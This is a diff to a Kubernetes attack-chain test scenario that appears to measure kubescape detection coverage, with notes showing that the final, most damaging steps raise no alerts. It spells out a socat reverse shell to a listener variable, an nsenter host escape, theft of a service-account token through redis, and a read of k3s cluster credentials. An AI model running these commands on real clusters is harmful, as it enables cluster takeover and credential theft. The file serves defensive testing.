@@ -11,17 +11,31 @@ metadata:
     keyed by RuleID + containerName + profileMetadata.name, cross-checked
     against Ran's execution records for the actor of each step.
 
-    Read the per-step notes before scoring. Three of these four steps run in
-    agent-worker, which carries NO user-defined profile: the orchestrator
-    creates worker pods per task and never stamps the
-    kubescape.io/user-defined-profile label, so node-agent covers them as
-    rogue artefacts instead of binding a profile. Rules that need a profile
-    to define "unexpected" therefore cannot fire there, and the absence is
-    structural, not a tuning miss. redis-rce is the contrast: redis IS
-    bound, and the same class of action lights up.
+    Read the per-step notes before scoring. FIVE of the eight steps run in a
+    container with NO user-defined profile: agent-worker, because the
+    orchestrator creates worker pods per task and never stamps the
+    kubescape.io/user-defined-profile label, and ran-privileged, because it is
+    attacker-created and there is no workload to bind. node-agent covers both
+    as rogue artefacts. Rules that need a profile to define "unexpected"
+    cannot fire there, so the absence is structural, not a tuning miss.
 
-    This is the first four entries only — the ones with a single
-    unambiguous actor. The remaining four follow.
+    The shape of the result is worth stating plainly, because it inverts what
+    a reader expects. Coverage is HIGHEST at the start of the chain and
+    DISAPPEARS at the end:
+
+      redis-rce               5 detections   (redis is bound)
+      cve-2026-47701-extract  2
+      worker-callback         1   rogue-artefact coverage of the pod only
+      nmap-sweep              1
+      privileged-pod          1   rogue-artefact coverage of the pod only
+      sa-token-read           0
+      host-escape             0
+      k3s-credential-read     0
+
+    The two steps that end in full node and cluster compromise raise nothing
+    at all. An empty expectedDetections here is a measured zero, never a
+    placeholder — if K-P1 reports PC 0 for those, it is reading the run
+    correctly.
 
 target:
   namespace: agent-system
@@ -99,3 +113,81 @@ attacks:
       - { ruleID: R0002, ruleName: Files Access Anomalies in container, containerName: redis, command: sh }
       - { ruleID: R0004, ruleName: Linux Capabilities Anomalies in container, containerName: redis, command: sh }
       - { ruleID: R1001, ruleName: Drifted process executed, containerName: worker, command: redis-cli }
+
+  - name: cve-2026-47701-extract
+    type: cmdinject
+    gateEntry: cve-2026-47701-extract
+    actor: oopservability/oopservability-redis
+    exec: { command: ["redis-cli", "--raw", "GET", "oopservability:receiver:last-authorization"] }
+    notes: |
+      The CVE payoff. A ServiceMonitor with an unsafe bearerTokenFile makes the
+      injected OTel sidecar authenticate to redis's metric-receiver, which parks
+      the sidecar's own Bearer token in a redis key; the RCE reads it back. The
+      token belongs to agent-orchestrator and can create Pods.
+
+      SCORING THIS ENTRY DEPENDS ON THE RIG, so do not compare runs across
+      clusters without reading this:
+
+      (a) The sidecar's token READ no longer alerts, deliberately. It raised
+          R0006, but the sidecar must read its own token to authenticate at
+          all, so it is allowlisted in cp-agent-orchestrator-otel-collector.yaml
+          (the ⋯/ca.crt and ⋯/token opens). The read is not the malignant act.
+      (b) The malignant act is the token LEAVING, and that is undeclared
+          egress: the sidecar's SBoB allows exactly two peers, target-allocator
+          :80 and kube-dns :53. Redis is not among them, so R0011 SHOULD fire.
+      (c) It does not fire on the single-node k3s rig these values were
+          measured on — R0011 raised nothing there across a full chain. It DOES
+          fire on the Cilium rig. Treat an absent R0011 here as a rig property
+          to be confirmed, not as a missed detection by the chain.
+
+      Observed on the measuring rig: R0001 for redis-cli inside redis, and
+      R0006 on redis for the earlier SA-token read through the RCE.
+    expectedDetections:
+      - { ruleID: R0001, ruleName: Unexpected process launched, containerName: redis, command: redis-cli }
+      - { ruleID: R0006, ruleName: Unexpected service account token access, containerName: redis }
+
+  - name: privileged-pod
+    type: cmdinject
+    gateEntry: privileged-pod
+    actor: agent-system/ran-privileged
+    exec: { command: ["socat", "TCP:$LISTENER:1337", "EXEC:sh"] }
+    notes: |
+      The stolen agent-orchestrator token creates a Pod with hostPath / and
+      hostPID that calls back. Unprofiled by nature — it is attacker-created,
+      so there is no workload for anyone to have bound a profile to. Coverage
+      is therefore rogue-artefact coverage, exactly as for agent-worker, and
+      for a more defensible reason.
+      OBSERVED: R1017 only.
+    expectedDetections:
+      - { ruleID: R1017, ruleName: Rogue artefact, containerName: ran-privileged }
+
+  - name: host-escape
+    type: cmdinject
+    gateEntry: host-escape
+    actor: agent-system/ran-privileged
+    exec: { command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "hostname"] }
+    notes: |
+      Entering the host namespaces from the privileged pod. This is the step
+      the workshop builds to, and it is the LEAST visible one in the whole
+      chain: the only thing raised was the R1017 already credited to
+      privileged-pod above, carrying no path and no process detail.
+      Deliberately NOT crediting that R1017 twice. If K-P1 reports PC 0 here,
+      that is the correct reading of what the run produced.
+    expectedDetections: []
+
+  - name: k3s-credential-read
+    type: cmdinject
+    gateEntry: k3s-credential-read
+    actor: agent-system/ran-privileged
+    exec: { command: ["cat", "/host/etc/rancher/k3s/k3s.yaml"] }
+    notes: |
+      Reading the cluster credentials off the mounted host filesystem — the
+      end state of the chain, full cluster compromise.
+      OBSERVED: nothing. No R0010, no R0002, no path-bearing alert of any
+      kind. The file lives on a hostPath mount inside an unprofiled,
+      attacker-created pod, so there is no baseline that could call the read
+      unexpected.
+      This and host-escape are the two entries I would put in front of anyone
+      arguing the chain is well covered: the first and least damaging steps
+      raise the most, and the last and most damaging raise nothing.
+    expectedDetections: []
